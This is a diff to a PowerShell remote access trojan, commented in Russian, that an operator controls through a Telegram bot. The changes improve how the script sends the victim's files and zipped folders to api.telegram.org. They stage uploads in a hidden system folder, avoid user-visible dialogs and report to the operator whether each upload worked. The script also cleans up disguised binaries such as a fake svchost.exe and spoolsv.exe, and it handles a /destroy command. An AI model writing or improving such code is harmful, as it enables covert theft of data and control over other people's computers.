@@ -77,7 +77,20 @@ function Send-TelegramFile {
     $url = "https://api.telegram.org/bot$Token/sendDocument"
     
     try {
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        # Создаем временную копию файла с уникальным именем
+        $tempDir = "$env:TEMP\TelegramUpload"
+        if (!(Test-Path $tempDir)) {
+            New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+            attrib +s +h "$tempDir" 2>&1 | Out-Null
+        }
+        
+        $originalName = Split-Path $FilePath -Leaf
+        $tempFilePath = Join-Path $tempDir "$([System.IO.Path]::GetRandomFileName())_$originalName"
+        
+        # Копируем файл во временную директорию
+        Copy-Item $FilePath $tempFilePath -Force
+        
+        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
         $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
         $boundary = [System.Guid]::NewGuid().ToString()
 
@@ -87,26 +100,38 @@ function Send-TelegramFile {
             "",
             $ChatID,
             "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"",
             "Content-Type: application/octet-stream",
             "",
             $fileEnc,
             "--$boundary--"
         ) -join "`r`n"
 
-        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
+        $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
+        
+        # Удаляем временный файл после отправки
+        Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
+        return $true
+        
     } catch {
         try {
-            # Резервный метод отправки файла
-            $fileInfo = Get-Item $FilePath
-            $fileStream = [System.IO.File]::OpenRead($FilePath)
+            # Резервный метод отправки файла - используем MemoryStream чтобы избежать диалогов
+            Add-Type -AssemblyName System.Web
+            
+            $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
+            $fileStream = New-Object System.IO.MemoryStream(,$fileContent)
+            
             $form = @{
                 chat_id = $ChatID
                 document = $fileStream
             }
             Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
             $fileStream.Close()
-        } catch { }
+            $fileStream.Dispose()
+            return $true
+        } catch {
+            return $false
+        }
     }
 }
 
@@ -165,14 +190,15 @@ function Invoke-Cleanup {
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
         "$env:WINDIR\System32\System32Logs\svchost.exe",
-        "$env:TEMP\windows_update.marker"
+        "$env:TEMP\windows_update.marker",
+        "$env:TEMP\TelegramUpload\*"
     )
 
     $deletedFiles = @()
     foreach ($filePattern in $filesToDelete) {
         try {
             Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
-                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue -Recurse
                 $deletedFiles += $_.FullName
             }
         } catch { }
@@ -359,20 +385,32 @@ $($fileList -join "`n")"
                             $fullPath = Join-Path $currentDir $target
                             
                             if (Test-Path $fullPath) {
+                                Send-Telegram "⏳ Начинаю отправку файла: $target"
+                                
                                 if (Test-Path $fullPath -PathType Container) {
                                     # Архивируем папку
                                     $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                     if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
-                                        Send-Telegram "Папка $target заархивирована" $zipPath
+                                        $result = Send-TelegramFile -FilePath $zipPath
+                                        if ($result) {
+                                            Send-Telegram "✅ Папка $target успешно отправлена"
+                                        } else {
+                                            Send-Telegram "❌ Ошибка отправки папки: $target"
+                                        }
                                         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                     } else {
-                                        Send-Telegram "Ошибка архивации папки: $target"
+                                        Send-Telegram "❌ Ошибка архивации папки: $target"
                                     }
                                 } else {
-                                    Send-Telegram "Файл $target отправлен" $fullPath
+                                    $result = Send-TelegramFile -FilePath $fullPath
+                                    if ($result) {
+                                        Send-Telegram "✅ Файл $target успешно отправлен"
+                                    } else {
+                                        Send-Telegram "❌ Ошибка отправки файла: $target"
+                                    }
                                 }
                             } else {
-                                Send-Telegram "Файл/папка не найдены: $target"
+                                Send-Telegram "❌ Файл/папка не найдены: $target"
                             }
                         }
                         "^/destroy$" {
